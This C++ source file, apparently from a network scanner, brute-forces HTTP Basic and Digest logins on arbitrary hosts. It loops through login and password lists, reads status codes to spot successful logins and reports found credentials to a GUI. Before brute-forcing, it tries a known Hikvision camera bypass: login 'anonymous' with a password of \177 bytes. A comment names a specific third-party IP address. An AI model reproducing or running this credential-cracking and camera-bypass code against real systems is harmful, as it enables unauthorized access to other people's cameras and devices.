#include "BasicAuth.h"
#include "FileUpdater.h"

int BA::checkOutput(const string *buffer, const char *ip, const int port) {
    if((Utils::ustrstr(*buffer, "200 ok") != -1 ||
            Utils::ustrstr(*buffer, "http/1.0 200") != -1 ||
			Utils::ustrstr(*buffer, "http/1.1 200") != -1)
			&& Utils::ustrstr(*buffer, "http/1.1 401 ") == -1
			&& Utils::ustrstr(*buffer, "http/1.0 401 ") == -1
			&& Utils::ustrstr(*buffer, "<statusValue>401</statusValue>") == -1
			&& Utils::ustrstr(*buffer, "<statusString>Unauthorized</statusString>") == -1
			&& Utils::ustrstr(*buffer, "íåïðàâèëüíû") == -1
			&& Utils::ustrstr(*buffer, "ÐÐµÐ¿Ñ€Ð°Ð²Ð¸Ð»ÑŒÐ½Ñ‹") == -1
			&& Utils::ustrstr(*buffer, "code: \"401\"") == -1 //77.51.196.31:81
            ) {
        return 1;
	}
	else if (Utils::ustrstr(*buffer, "http/1.1 404") != -1
		|| Utils::ustrstr(*buffer, "http/1.0 404") != -1) return -2; 
	else if (Utils::ustrstr(*buffer, "503 service unavailable") != -1
		|| Utils::ustrstr(*buffer, "http/1.1 503") != -1
		|| Utils::ustrstr(*buffer, "http/1.0 503") != -1
		|| Utils::ustrstr(*buffer, "400 BAD_REQUEST") != -1
		|| Utils::ustrstr(*buffer, "400 bad request") != -1
		|| Utils::ustrstr(*buffer, "403 Forbidden") != -1
		)
	{
		Sleep(30000);
		return -1;
	}

    return 0;
}

//http://www.coresecurity.com/advisories/hikvision-ip-cameras-multiple-vulnerabilities 2
inline bool commenceHikvisionEx1(const char *ip, const int port, bool digestMode) {
	std::string lpString = string("anonymous") + ":" + string("\177\177\177\177\177\177");

	string buffer;
	Connector con;
	int res = con.nConnect(ip, port, &buffer, NULL, NULL, &lpString, digestMode);
	if (res > 0) {
		if (BA::checkOutput(&buffer, ip, port) == 1) return 1;
	}
	return 0;
}

lopaStr BA::BABrute(const char *ip, const int port) {
	bool digestMode = true;
	string lpString;
    lopaStr lps = {"UNKNOWN", "", ""};
    int passCounter = 0;
	int res = 0;
	int rowIndex = -1;

	std::string buff;
	Connector con;

	con.nConnect(ip, port, &buff);
	int isDig = Utils::isDigest(&buff);
	QString ipString = QString(ip).mid(0, QString(ip).indexOf("/")) + ":" + QString::number(port);
	if (isDig == -1) {
		stt->doEmitionFoundData("<span style=\"color:orange;\">No 401 detected - <a style=\"color:orange;\" href=\"http://" + ipString + "/\">" +
			ipString + "</a></span>");
		strcpy(lps.login, "");
		return lps;
	}
	else if (isDig == 1) digestMode = true; 
	else digestMode = false;

	std::string buffer;

	if (commenceHikvisionEx1(ip, port, digestMode)) {
		strcpy(lps.login, "anonymous");
		strcpy(lps.pass, "\177\177\177\177\177\177");
		return lps;
	}

    for(int i = 0; i < MaxLogin; ++i) {
        for (int j = 0; j < MaxPass; ++j) {
            FileUpdater::cv.wait(FileUpdater::lk, []{return FileUpdater::ready;});
            if (!globalScanFlag) return lps;

            lpString = string(loginLst[i]) + ":" + string(passLst[j]);

			Connector con;
			res = con.nConnect(ip, port, &buffer, NULL, NULL, &lpString, digestMode);
			if (res == -2) return lps;
			else if (res != -1) {
				res = checkOutput(&buffer, ip, port);
				if (res == -2) {

					if (rowIndex == -1) {
						nesca_3::addBARow(QString(ip) + ":" + QString::number(port), "--", "404");
					}
					else {
						stt->doEmitionChangeBARow(rowIndex, "--", "404");
					}
					strcpy(lps.other, "404");
					return lps;
				}
				if (res == -1) {
					++i;
					break;
				}
				if (res == 1) {
					if (rowIndex == -1) {
						nesca_3::addBARow(QString(ip) + ":" + QString::number(port), QString(loginLst[i]) + ":" + QString(passLst[j]), "OK");
					}
					else {
						stt->doEmitionChangeBARow(rowIndex, QString(loginLst[i]) + ":" + QString(passLst[j]), "OK");
					}

					strcpy(lps.login, loginLst[i]);
					strcpy(lps.pass, passLst[j]);
					return lps;
				};
			}

			if (BALogSwitched) {
				if (rowIndex == -1) {
					rowIndex = nesca_3::addBARow(QString(ip) + ":" + QString::number(port),
						QString(loginLst[i]) + ":" + QString(passLst[j]),
						QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%");
				}
				else {
					stt->doEmitionChangeBARow(rowIndex, QString(loginLst[i]) + ":" + QString(passLst[j]), 
						QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%");
				}
			}
			else { rowIndex = -1; }
			++passCounter;
            Sleep(50);
        }
    }

	if (rowIndex == -1) {
		nesca_3::addBARow(QString(ip) + ":" + QString::number(port), "--", "FAIL");
	}
	else {
		stt->doEmitionChangeBARow(rowIndex, "--", "FAIL");
	}
    return lps;
}

lopaStr BA::BALobby(const char *ip, const int port) {
    if(gMaxBrutingThreads > 0) {

        while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

		++baCount;
		++BrutingThrds;
		const lopaStr &lps = BABrute(ip, port);
		--BrutingThrds;

        return lps;
    } else {
        lopaStr lps = {"UNKNOWN", "", ""};
        return lps;
    }
}
